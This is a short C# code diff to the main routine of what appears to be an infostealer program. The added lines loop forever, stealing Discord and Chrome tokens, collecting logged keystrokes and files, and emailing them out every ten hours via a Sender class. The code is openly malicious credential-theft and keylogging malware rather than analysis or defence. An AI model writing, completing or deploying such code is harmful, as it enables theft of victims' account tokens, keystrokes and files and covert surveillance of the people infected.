@@ -21,15 +21,26 @@ namespace Fin
 
        
             Thief thief = new Thief();
-            thief.stealDiscordToken();
-            Console.WriteLine("tkn stolen");
             Thread t = new  Thread(thief.listen);
             t.Start();
-            Console.WriteLine("waiting");
-            Thread.Sleep(10000);
-            Console.WriteLine("next");
-            Sender.email_send(thief.files, Observer.keys);
-            Console.WriteLine("done");
+            
+            thief.stealDiscordToken();
+            Console.WriteLine(thief.token);
+            
+           while (true)
+            {
+                thief.stealDiscordToken();
+               
+                string k = Observer.keys;
+                Observer.keys = "";
+                Sender.email_send(thief.DiscordToken, thief.ChromeToken, thief.files, k + "das");
+                thief.files.Clear();
+                
+                
+                Thread.Sleep(1000*1*60*1*60*10);
+            }
+          
+      
         }
 
 
